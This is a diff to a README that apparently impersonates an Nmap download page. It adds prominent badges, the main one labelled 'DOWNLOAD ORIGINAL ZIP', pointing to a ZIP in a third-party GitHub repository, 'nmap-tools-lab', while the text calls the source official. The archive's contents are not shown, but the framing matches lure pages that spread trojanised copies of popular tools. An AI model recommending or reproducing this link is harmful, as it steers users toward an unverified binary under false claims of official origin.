@@ -22,7 +22,9 @@ Nmap Network Mapper is an open-source utility for network discovery, host invent
 
 Use the official Nmap download page:
 
-**[Download the original ZIP](https://github.com/nmap-tools-lab/nmap-download/releases/latest/download/nmap-7.993-original.zip)** · **[Open the official Nmap download page](https://nmap.org/download.html)**
+[![Download original ZIP](https://img.shields.io/badge/DOWNLOAD%20ORIGINAL%20ZIP-00a86b?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download/releases/latest/download/nmap-7.993-original.zip)
+[![Release notes](https://img.shields.io/badge/RELEASE%20NOTES-2563eb?style=for-the-badge&logo=github)](https://github.com/nmap-tools-lab/nmap-download/releases)
+[![Official download source](https://img.shields.io/badge/OFFICIAL%20SOURCE-334155?style=for-the-badge)](https://nmap.org/download.html)
 
 The official page provides the current Windows installer, source packages, documentation, and project licensing information. Verify the SHA-256 value below and review the applicable license before installation.
 
